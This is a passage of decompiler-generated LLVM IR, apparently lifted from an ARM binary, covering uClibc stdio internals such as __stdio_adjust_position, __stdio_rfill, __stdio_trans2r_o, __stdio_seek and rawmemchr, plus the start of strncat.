  %v5_11168 = inttoptr i32 %v4_11168 to i8*
  store i8 %v2_11168, i8* %v5_11168, align 1
  %v0_1116c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1116c.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_1116c = load i32, i32* %r1.global-to-local, align 4
  %v2_1116c = trunc i32 %v1_1116c to i8
  %v3_1116c = load i32, i32* @r4, align 4
  %v4_1116c = inttoptr i32 %v3_1116c to i8*
  store i8 %v2_1116c, i8* %v4_1116c, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_11170 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11170, i32* @r4, align 4
  %v11_11170 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_11170

; uselistorder directives
  uselistorder i32 %v3_11154, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_11174 = load i32, i32* @r4, align 4
  store i32 %v3_11174, i32* %stack_var_-16, align 4
  %v2_11178 = add i32 %tmp, 1
  %v3_11178 = inttoptr i32 %v2_11178 to i8*
  %v4_11178 = load i8, i8* %v3_11178, align 1
  %v5_11178 = zext i8 %v4_11178 to i32
  %v3_1117c = load i8, i8* %arg1, align 1
  %v4_1117c = zext i8 %v3_1117c to i32
  store i32 %v4_1117c, i32* %r2.global-to-local, align 4
  %v4_11180 = mul nuw nsw i32 %v5_11178, 256
  %v5_11180 = or i32 %v4_1117c, %v4_11180
  store i32 %v5_11180, i32* @lr, align 4
  %tmp15 = urem i8 %v3_1117c, 4
  %v2_11184 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_11184, label %bb, label %dec_label_pc_11194

bb:                                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  br label %.thread

dec_label_pc_11194:                               ; preds = %entry
  %v1_11184 = zext i8 %tmp15 to i32
  %v1_11194 = add nsw i32 %v1_11184, -1
  store i32 %v1_11194, i32* @ip, align 4
  %v7_11194 = icmp eq i8 %tmp15, 1
  br i1 %v7_11194, label %.thread, label %dec_label_pc_1119c

dec_label_pc_1119c:                               ; preds = %dec_label_pc_11194
  %v1_1119c = and i32 %v4_11180, 2048
  %v2_1119c = icmp eq i32 %v1_1119c, 0
  br i1 %v2_1119c, label %.thread, label %dec_label_pc_111a4

dec_label_pc_111a4:                               ; preds = %dec_label_pc_1119c
  %v8_111a8 = icmp sgt i32 %v1_11194, 1
  br i1 %v8_111a8, label %dec_label_pc_11234, label %dec_label_pc_111ac

dec_label_pc_111ac:                               ; preds = %dec_label_pc_111a4
  %v2_111ac = add i32 %tmp, 40
  %v3_111ac = inttoptr i32 %v2_111ac to i32*
  %v4_111ac = load i32, i32* %v3_111ac, align 4
  %v2_111b0 = icmp eq i32 %v4_111ac, 0
  br i1 %v2_111b0, label %dec_label_pc_111b8, label %dec_label_pc_11234

dec_label_pc_111b8:                               ; preds = %dec_label_pc_111ac
  %v2_111b8 = add i32 %tmp, 3
  %v3_111b8 = inttoptr i32 %v2_111b8 to i8*
  %v4_111b8 = load i8, i8* %v3_111b8, align 1
  %v5_111b8 = zext i8 %v4_111b8 to i32
  %v2_111bc = add i32 %tmp, 44
  %v3_111bc = inttoptr i32 %v2_111bc to i32*
  %v4_111bc = load i32, i32* %v3_111bc, align 4
  store i32 %v4_111bc, i32* %r2.global-to-local, align 4
  %v2_111c0 = sub nsw i32 %v1_11194, %v5_111b8
  %v1_111c8 = add nsw i32 %v2_111c0, -1
  store i32 %v1_111c8, i32* @ip, align 4
  %tmp11 = icmp slt i32 %v4_111bc, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_111b8
  %v7_111cc = add i32 %tmp, 2
  %v8_111cc = inttoptr i32 %v7_111cc to i8*
  %v9_111cc = load i8, i8* %v8_111cc, align 1
  %v10_111cc = zext i8 %v9_111cc to i32
  %v7_111d0 = sub nsw i32 %v1_111c8, %v10_111cc
  store i32 %v7_111d0, i32* @ip, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_111b8, %bb, %dec_label_pc_1119c, %dec_label_pc_11194, %bb12
  %v0_111ec = phi i32 [ %v1_11194, %dec_label_pc_1119c ], [ %v1_11194, %dec_label_pc_11194 ], [ 0, %bb ], [ %v7_111d0, %bb12 ], [ %v1_111c8, %dec_label_pc_111b8 ]
  %v1_111d4 = and i32 %v4_1117c, 64
  %v2_111d4 = icmp eq i32 %v1_111d4, 0
  %storemerge.in.in.v = select i1 %v2_111d4, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_111e0 = add i32 %tmp, 16
  %v3_111e0 = inttoptr i32 %v2_111e0 to i32*
  %v4_111e0 = load i32, i32* %v3_111e0, align 4
  %v2_111e4 = sub i32 %storemerge, %v4_111e0
  %v1_111e8 = inttoptr i32 %arg2 to i32*
  %v2_111e8 = load i32, i32* %v1_111e8, align 4
  store i32 %v2_111e8, i32* %r1.global-to-local, align 4
  %v3_111e8 = add i32 %arg2, 4
  %v4_111e8 = inttoptr i32 %v3_111e8 to i32*
  %v5_111e8 = load i32, i32* %v4_111e8, align 4
  store i32 %v5_111e8, i32* %r2.global-to-local, align 4
  %v2_111ec = add i32 %v2_111e4, %v0_111ec
  store i32 %v2_111ec, i32* %r5.global-to-local, align 4
  %v2_111f0 = sub i32 %v2_111e8, %v2_111ec
  %v2_111f4 = and i32 %v2_111ec, 1073741824
  %v3_111f4 = icmp ne i32 %v2_111f4, 0
  %v6_111f4 = icmp eq i1 %v3_111f4, false
  %tmp16 = icmp slt i32 %v2_111ec, 0
  %v4_111f4.neg = zext i1 %tmp16 to i32
  %v7_111f4 = add i32 %v5_111e8, %v4_111f4.neg
  %v9_111f4 = sext i1 %v6_111f4 to i32
  %v10_111f4 = add i32 %v7_111f4, %v9_111f4
  store i32 %v10_111f4, i32* %r4.global-to-local, align 4
  store i32 %v2_111f0, i32* %v1_111e8, align 4
  %v5_111f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_111f8, i32* %v4_111e8, align 4
  %v0_111fc = load i32, i32* %r6.global-to-local, align 4
  %v1_111fc = add i32 %v0_111fc, 4
  %v2_111fc = inttoptr i32 %v1_111fc to i32*
  %v3_111fc = load i32, i32* %v2_111fc, align 4
  %v1_11200 = load i32, i32* %r2.global-to-local, align 4
  %v8_11204 = icmp sgt i32 %v3_111fc, %v1_11200
  br i1 %v8_11204, label %dec_label_pc_11218, label %dec_label_pc_11208

dec_label_pc_11208:                               ; preds = %.thread
  %v9_11200 = icmp eq i32 %v3_111fc, %v1_11200
  br i1 %v9_11200, label %dec_label_pc_1120c, label %dec_label_pc_1121cthread-pre-split

dec_label_pc_1120c:                               ; preds = %dec_label_pc_11208
  %v1_1120c = inttoptr i32 %v0_111fc to i32*
  %v2_1120c = load i32, i32* %v1_1120c, align 4
  %v1_11210 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_1120c, %v1_11210
  br i1 %tmp17, label %dec_label_pc_11218, label %dec_label_pc_1121cthread-pre-split

dec_label_pc_11218:                               ; preds = %dec_label_pc_1120c, %.thread
  %v0_11218 = load i32, i32* %r5.global-to-local, align 4
  %v1_11218 = sub i32 0, %v0_11218
  store i32 %v1_11218, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1121c

dec_label_pc_1121cthread-pre-split:               ; preds = %dec_label_pc_1120c, %dec_label_pc_11208
  %v0_1121c.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1121c

dec_label_pc_1121c:                               ; preds = %dec_label_pc_1121cthread-pre-split, %dec_label_pc_11218
  %v0_1121c = phi i32 [ %v0_1121c.pr, %dec_label_pc_1121cthread-pre-split ], [ %v1_11218, %dec_label_pc_11218 ]
  %v1_1121c = icmp slt i32 %v0_1121c, 0
  br i1 %v1_1121c, label %dec_label_pc_11224, label %dec_label_pc_11238

dec_label_pc_11224:                               ; preds = %dec_label_pc_1121c
  %v0_11224 = call i32 @__errno_location()
  %v2_1122c = inttoptr i32 %v0_11224 to i32*
  store i32 75, i32* %v2_1122c, align 4
  %v0_11238.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11238

dec_label_pc_11234:                               ; preds = %dec_label_pc_111ac, %dec_label_pc_111a4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11238

dec_label_pc_11238:                               ; preds = %dec_label_pc_1121c, %dec_label_pc_11224, %dec_label_pc_11234
  %v0_11238 = phi i32 [ %v0_1121c, %dec_label_pc_1121c ], [ %v0_11238.pre, %dec_label_pc_11224 ], [ -1, %dec_label_pc_11234 ]
  %v2_1123c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1123c, i32* @r4, align 4
  ret i32 %v0_11238

; uselistorder directives
  uselistorder i32 %v1_11200, { 1, 0 }
  uselistorder i32 %v3_111fc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_1117c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11238, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11240 = load i32, i32* @r4, align 4
  store i32 %v3_11240, i32* %stack_var_-8, align 4
  %v1_11244 = add i32 %arg1, 8
  %v1_11248 = inttoptr i32 %v1_11244 to i32*
  %v2_11248 = load i32, i32* %v1_11248, align 4
  store i32 %v2_11248, i32* @r1, align 4
  %v3_11248 = add i32 %arg1, 12
  %v4_11248 = inttoptr i32 %v3_11248 to i32*
  %v5_11248 = load i32, i32* %v4_11248, align 4
  %v2_1124c = sub i32 %v5_11248, %v2_11248
  store i32 %v2_1124c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_11254 = inttoptr i32 %arg1 to i8*
  %v4_11254 = call i32 @__stdio_READ(i8* %v3_11254, i32 %v2_11248, i32 %v2_1124c)
  %v0_11258 = load i32, i32* @r4, align 4
  %v1_11258 = add i32 %v0_11258, 8
  %v2_11258 = inttoptr i32 %v1_11258 to i32*
  %v3_11258 = load i32, i32* %v2_11258, align 4
  store i32 %v3_11258, i32* %r2.global-to-local, align 4
  %v2_1125c = add i32 %v3_11258, %v4_11254
  %v2_11260 = add i32 %v0_11258, 20
  %v3_11260 = inttoptr i32 %v2_11260 to i32*
  store i32 %v2_1125c, i32* %v3_11260, align 4
  %v0_11264 = load i32, i32* %r2.global-to-local, align 4
  %v1_11264 = load i32, i32* @r4, align 4
  %v2_11264 = add i32 %v1_11264, 16
  %v3_11264 = inttoptr i32 %v2_11264 to i32*
  store i32 %v0_11264, i32* %v3_11264, align 4
  %v2_11268 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11268, i32* @r4, align 4
  ret i32 %v4_11254

; uselistorder directives
  uselistorder i32 %v4_11254, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1126c = load i32, i32* @r4, align 4
  store i32 %v3_1126c, i32* %stack_var_-12, align 4
  %v0_11270 = load i32, i32* @r0, align 4
  %v1_11270 = inttoptr i32 %v0_11270 to i8*
  %v2_11270 = load i8, i8* %v1_11270, align 1
  %v3_11270 = zext i8 %v2_11270 to i32
  store i32 %v3_11270, i32* %r2.global-to-local, align 4
  %v1_11274 = add i32 %v0_11270, 1
  %v2_11274 = inttoptr i32 %v1_11274 to i8*
  %v3_11274 = load i8, i8* %v2_11274, align 1
  %v4_11274 = zext i8 %v3_11274 to i32
  store i32 %v4_11274, i32* %r3.global-to-local, align 4
  %v4_11278 = mul nuw nsw i32 %v4_11274, 256
  %v5_11278 = or i32 %v4_11278, %v3_11270
  store i32 %v5_11278, i32* %r2.global-to-local, align 4
  %v1_1127c = load i32, i32* @r1, align 4
  %v2_1127c = and i32 %v1_1127c, %v5_11278
  %v4_1127c = icmp eq i32 %v2_1127c, 0
  store i32 %v0_11270, i32* @r4, align 4
  br i1 %v4_1127c, label %dec_label_pc_11288, label %dec_label_pc_112a0

dec_label_pc_11288:                               ; preds = %entry
  %v1_11288 = and i32 %v5_11278, 2176
  %v2_11288 = icmp eq i32 %v1_11288, 0
  br i1 %v2_11288, label %dec_label_pc_11290, label %dec_label_pc_112b4

dec_label_pc_11290:                               ; preds = %dec_label_pc_11288
  %v2_11290 = or i32 %v1_1127c, %v5_11278
  store i32 %v2_11290, i32* %r2.global-to-local, align 4
  %v3_11294 = sdiv i32 %v2_11290, 256
  store i32 %v3_11294, i32* %r3.global-to-local, align 4
  %v1_11298 = trunc i32 %v3_11294 to i8
  store i8 %v1_11298, i8* %v2_11274, align 1
  %v0_1129c = load i32, i32* %r2.global-to-local, align 4
  %v1_1129c = trunc i32 %v0_1129c to i8
  %v2_1129c = load i32, i32* @r0, align 4
  %v3_1129c = inttoptr i32 %v2_1129c to i8*
  store i8 %v1_1129c, i8* %v3_1129c, align 1
  %v0_112a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_112a0

dec_label_pc_112a0:                               ; preds = %entry, %dec_label_pc_11290
  %v0_112a0 = phi i32 [ %v0_11270, %entry ], [ %v0_112a0.pre, %dec_label_pc_11290 ]
  %v1_112a0 = inttoptr i32 %v0_112a0 to i8*
  %v2_112a0 = load i8, i8* %v1_112a0, align 1
  %v3_112a0 = zext i8 %v2_112a0 to i32
  store i32 %v3_112a0, i32* %r2.global-to-local, align 4
  %v1_112a4 = add i32 %v0_112a0, 1
  %v2_112a4 = inttoptr i32 %v1_112a4 to i8*
  %v3_112a4 = load i8, i8* %v2_112a4, align 1
  %v4_112a4 = zext i8 %v3_112a4 to i32
  %v4_112a8 = mul nuw nsw i32 %v4_112a4, 256
  %v5_112a8 = or i32 %v4_112a8, %v3_112a0
  store i32 %v5_112a8, i32* %r3.global-to-local, align 4
  %v1_112ac = and i32 %v3_112a0, 16
  store i32 %v1_112ac, i32* %r5.global-to-local, align 4
  %v2_112ac = icmp eq i32 %v1_112ac, 0
  br i1 %v2_112ac, label %dec_label_pc_112dc, label %dec_label_pc_112b4

dec_label_pc_112b4:                               ; preds = %dec_label_pc_11288, %dec_label_pc_112a0
  %v0_112b4 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_112bc = inttoptr i32 %v0_112b4 to i32*
  store i32 9, i32* %v2_112bc, align 4
  br label %dec_label_pc_112c0

dec_label_pc_112c0:                               ; preds = %dec_label_pc_112e4, %dec_label_pc_112b4
  %v0_112c0 = load i32, i32* @r4, align 4
  %v1_112c0 = inttoptr i32 %v0_112c0 to i32*
  %v2_112c0 = load i32, i32* %v1_112c0, align 4
  %v1_112c4 = or i32 %v2_112c0, 8
  store i32 %v1_112c4, i32* %r3.global-to-local, align 4
  %v3_112c8 = sdiv i32 %v2_112c0, 256
  store i32 %v3_112c8, i32* %r2.global-to-local, align 4
  %v1_112d0 = trunc i32 %v3_112c8 to i8
  %v3_112d0 = add i32 %v0_112c0, 1
  %v4_112d0 = inttoptr i32 %v3_112d0 to i8*
  store i8 %v1_112d0, i8* %v4_112d0, align 1
  %v0_112d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_112d4 = trunc i32 %v0_112d4 to i8
  %v2_112d4 = load i32, i32* @r4, align 4
  %v3_112d4 = inttoptr i32 %v2_112d4 to i8*
  store i8 %v1_112d4, i8* %v3_112d4, align 1
  %v2_112d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_112d8, i32* @r4, align 4
  ret i32 -1

dec_label_pc_112dc:                               ; preds = %dec_label_pc_112a0
  %v1_112dc = and i32 %v3_112a0, 64
  %v2_112dc = icmp eq i32 %v1_112dc, 0
  br i1 %v2_112dc, label %dec_label_pc_1130c, label %dec_label_pc_112e4

dec_label_pc_112e4:                               ; preds = %dec_label_pc_112dc
  %v0_112e4 = call i32 @__stdio_wcommit()
  %v2_112e8 = icmp eq i32 %v0_112e4, 0
  br i1 %v2_112e8, label %dec_label_pc_112f0, label %dec_label_pc_112c0

dec_label_pc_112f0:                               ; preds = %dec_label_pc_112e4
  %v0_112f0 = load i32, i32* @r4, align 4
  %v1_112f0 = inttoptr i32 %v0_112f0 to i32*
  %v2_112f0 = load i32, i32* %v1_112f0, align 4
  store i32 %v2_112f0, i32* %r3.global-to-local, align 4
  %v1_112f4 = add i32 %v0_112f0, 8
  %v2_112f4 = inttoptr i32 %v1_112f4 to i32*
  %v3_112f4 = load i32, i32* %v2_112f4, align 4
  store i32 %v3_112f4, i32* %r2.global-to-local, align 4
  %v1_112f8 = and i32 %v2_112f0, -65
  store i32 %v1_112f8, i32* %r3.global-to-local, align 4
  %v3_112fc = sdiv i32 %v2_112f0, 256
  store i32 %v3_112fc, i32* %r1.global-to-local, align 4
  %v2_11300 = add i32 %v0_112f0, 28
  %v3_11300 = inttoptr i32 %v2_11300 to i32*
  store i32 %v3_112f4, i32* %v3_11300, align 4
  %v0_11304 = load i32, i32* %r1.global-to-local, align 4
  %v1_11304 = trunc i32 %v0_11304 to i8
  %v2_11304 = load i32, i32* @r4, align 4
  %v3_11304 = add i32 %v2_11304, 1
  %v4_11304 = inttoptr i32 %v3_11304 to i8*
  store i8 %v1_11304, i8* %v4_11304, align 1
  %v0_11308 = load i32, i32* %r3.global-to-local, align 4
  %v1_11308 = trunc i32 %v0_11308 to i8
  %v2_11308 = load i32, i32* @r4, align 4
  %v3_11308 = inttoptr i32 %v2_11308 to i8*
  store i8 %v1_11308, i8* %v3_11308, align 1
  %v0_1130c.pre = load i32, i32* @r4, align 4
  %v0_11318.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1130c

dec_label_pc_1130c:                               ; preds = %dec_label_pc_112dc, %dec_label_pc_112f0
  %v0_11318 = phi i32 [ 0, %dec_label_pc_112dc ], [ %v0_11318.pre, %dec_label_pc_112f0 ]
  %v2_1131c = phi i32 [ %v0_112a0, %dec_label_pc_112dc ], [ %v0_1130c.pre, %dec_label_pc_112f0 ]
  %v1_1130c = inttoptr i32 %v2_1131c to i32*
  %v2_1130c = load i32, i32* %v1_1130c, align 4
  %v1_11310 = or i32 %v2_1130c, 1
  store i32 %v1_11310, i32* %r3.global-to-local, align 4
  %v3_11314 = sdiv i32 %v2_1130c, 256
  store i32 %v3_11314, i32* %r2.global-to-local, align 4
  %v1_1131c = trunc i32 %v3_11314 to i8
  %v3_1131c = add i32 %v2_1131c, 1
  %v4_1131c = inttoptr i32 %v3_1131c to i8*
  store i8 %v1_1131c, i8* %v4_1131c, align 1
  %v0_11320 = load i32, i32* %r3.global-to-local, align 4
  %v1_11320 = trunc i32 %v0_11320 to i8
  %v2_11320 = load i32, i32* @r4, align 4
  %v3_11320 = inttoptr i32 %v2_11320 to i8*
  store i8 %v1_11320, i8* %v3_11320, align 1
  %v2_11324 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11324, i32* @r4, align 4
  ret i32 %v0_11318

; uselistorder directives
  uselistorder i32 %v3_11314, { 1, 0 }
  uselistorder i32 %v3_112c8, { 1, 0 }
  uselistorder i32 %v3_112a0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_112a0, { 0, 2, 1 }
  uselistorder i32 %v3_11294, { 1, 0 }
  uselistorder i32 %v5_11278, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1130c, { 1, 0 }
  uselistorder label %dec_label_pc_112b4, { 1, 0 }
  uselistorder label %dec_label_pc_112a0, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_1132c = load i32, i32* @r4, align 4
  %v6_1132c = load i32, i32* @lr, align 4
  %v1_11330 = add i32 %arg1, 4
  %v2_11330 = inttoptr i32 %v1_11330 to i32*
  %v3_11330 = load i32, i32* %v2_11330, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_11338 = load i32, i32* %arg2, align 4
  %v3_11338 = add i32 %tmp, 4
  %v4_11338 = inttoptr i32 %v3_11338 to i32*
  %v5_11338 = load i32, i32* %v4_11338, align 4
  %v6_1133c = call i32 @__libc_lseek64(i32 %v3_11330, i32 %v2_11338, i32 %v5_11338, i32 %arg3, i32 %v3_1132c, i32 %v6_1132c)
  %v1_11340 = icmp slt i32 %v2_11338, 0
  %v6_1133c. = select i1 %v1_11340, i32 %v6_1133c, i32 0
  store i32 %v6_1133c., i32* %r3.global-to-local, align 4
  br i1 %v1_11340, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_1134c = load i32, i32* @r4, align 4
  %v4_1134c = inttoptr i32 %v3_1134c to i32*
  store i32 %v6_1133c, i32* %v4_1134c, align 4
  %v6_1134c = add i32 %v3_1134c, 4
  %v7_1134c = inttoptr i32 %v6_1134c to i32*
  store i32 %v2_11338, i32* %v7_1134c, align 4
  %v0_11350.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_11350 = phi i32 [ %v6_1133c, %entry ], [ %v0_11350.pre, %bb ]
  ret i32 %v0_11350

; uselistorder directives
  uselistorder i32 %v6_1133c, { 0, 2, 1 }
  uselistorder i32 %v2_11338, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1137c:
  %v1_1135c = urem i32 %arg1, 256
  store i32 %v1_1135c, i32* @lr, align 4
  %v4_1137c = mul nuw nsw i32 %v1_1135c, 256
  %v5_1137c = or i32 %v4_1137c, %v1_1135c
  %v4_11384 = mul i32 %v5_1137c, 65536
  %v5_11384 = or i32 %v4_11384, %v5_1137c
  %v0_11388.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_11388

dec_label_pc_11388:                               ; preds = %dec_label_pc_113f4, %dec_label_pc_11388, %dec_label_pc_1137c
  %v0_11388 = phi i32 [ %v0_11388.pre, %dec_label_pc_1137c ], [ %v4_11388, %dec_label_pc_11388 ], [ %v4_11388, %dec_label_pc_113f4 ]
  %v1_11388 = inttoptr i32 %v0_11388 to i32*
  %v2_11388 = load i32, i32* %v1_11388, align 4
  %v4_11388 = add i32 %v0_11388, 4
  store i32 %v4_11388, i32* @ip, align 4
  %v2_11390 = xor i32 %v2_11388, %v5_11384
  %v2_11394 = add i32 %v2_11390, 2130640639
  %v1_1139c = sub i32 -1, %v2_11390
  %v2_113a0 = xor i32 %v2_11394, %v1_1139c
  %v2_113a4 = and i32 %v2_113a0, -2130640640
  %v2_113a8 = icmp eq i32 %v2_113a4, 0
  br i1 %v2_113a8, label %dec_label_pc_11388, label %dec_label_pc_113b0

dec_label_pc_113b0:                               ; preds = %dec_label_pc_11388
  %v2_113b0 = inttoptr i32 %v0_11388 to i8*
  %v3_113b0 = load i8, i8* %v2_113b0, align 1
  %v4_113b0 = zext i8 %v3_113b0 to i32
  %v9_113b8 = icmp eq i32 %v4_113b0, %v1_1135c
  store i1 %v9_113b8, i1* @cpsr_z, align 1
  %v1_113bc = add i32 %v0_11388, 3
  %v1_113c0 = add i32 %v0_11388, 1
  %v1_113c4 = add i32 %v0_11388, 2
  br i1 %v9_113b8, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_113b0
  ret i32 %v0_11388

bb18:                                             ; preds = %dec_label_pc_113b0
  %v2_113cc = inttoptr i32 %v1_113c0 to i8*
  %v3_113cc = load i8, i8* %v2_113cc, align 1
  %v4_113cc = zext i8 %v3_113cc to i32
  %v9_113d0 = icmp eq i32 %v4_113cc, %v1_1135c
  store i1 %v9_113d0, i1* @cpsr_z, align 1
  br i1 %v9_113d0, label %dec_label_pc_113d8, label %dec_label_pc_113e0

dec_label_pc_113d8:                               ; preds = %bb18
  ret i32 %v1_113c0

dec_label_pc_113e0:                               ; preds = %bb18
  %v2_113e0 = inttoptr i32 %v1_113c4 to i8*
  %v3_113e0 = load i8, i8* %v2_113e0, align 1
  %v4_113e0 = zext i8 %v3_113e0 to i32
  %v9_113e4 = icmp eq i32 %v4_113e0, %v1_1135c
  store i1 %v9_113e4, i1* @cpsr_z, align 1
  br i1 %v9_113e4, label %dec_label_pc_113ec, label %dec_label_pc_113f4

dec_label_pc_113ec:                               ; preds = %dec_label_pc_113e0
  ret i32 %v1_113c4

dec_label_pc_113f4:                               ; preds = %dec_label_pc_113e0
  %v2_113f4 = inttoptr i32 %v1_113bc to i8*
  %v3_113f4 = load i8, i8* %v2_113f4, align 1
  %v4_113f4 = zext i8 %v3_113f4 to i32
  %v9_113f8 = icmp eq i32 %v4_113f4, %v1_1135c
  store i1 %v9_113f8, i1* @cpsr_z, align 1
  br i1 %v9_113f8, label %dec_label_pc_11400, label %dec_label_pc_11388

dec_label_pc_11400:                               ; preds = %dec_label_pc_113f4
  ret i32 %v1_113bc

; uselistorder directives
  uselistorder i32 %v4_11388, { 2, 1, 0 }
  uselistorder i32 %v0_11388, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1137c, { 1, 0 }
  uselistorder i32 %v1_1135c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i1* @cpsr_z, { 8, 9, 10, 11, 0, 2, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 1, 4, 5, 6, 7 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11410 = load i32, i32* @r4, align 4
  store i32 %v3_11410, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1141c

dec_label_pc_1141c:                               ; preds = %dec_label_pc_1141c, %entry
  %v0_1141c = phi i32 [ %v5_1141c, %dec_label_pc_1141c ], [ %tmp, %entry ]
  %v1_1141c = inttoptr i32 %v0_1141c to i8*
  %v2_1141c = load i8, i8* %v1_1141c, align 1
  %v3_1141c = zext i8 %v2_1141c to i32
  store i32 %v3_1141c, i32* @ip, align 4
  %v5_1141c = add i32 %v0_1141c, 1
  store i32 %v5_1141c, i32* %r3.global-to-local, align 4
  %v2_11420 = icmp eq i8 %v2_1141c, 0
  store i1 %v2_11420, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11420, label %dec_label_pc_11428, label %dec_label_pc_1141c

dec_label_pc_11428:                               ; preds = %dec_label_pc_1141c
  %v0_11428 = load i32, i32* %r2.global-to-local, align 4
  %v7_11428 = icmp eq i32 %v0_11428, 3
  store i1 %v7_11428, i1* %cpsr_z.global-to-local, align 1
  %v1_1142c = add i32 %v0_1141c, -1
  store i32 %v1_1142c, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_11428, 4
  br i1 %tmp10, label %dec_label_pc_114c0thread-pre-split, label %dec_label_pc_11434

dec_label_pc_11434:                               ; preds = %dec_label_pc_11428
  %v3_11434 = udiv i32 %v0_11428, 4
  store i32 %v3_11434, i32* %r0.global-to-local, align 4
  %v0_11438.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11438

dec_label_pc_11438:                               ; preds = %dec_label_pc_11498, %dec_label_pc_11434
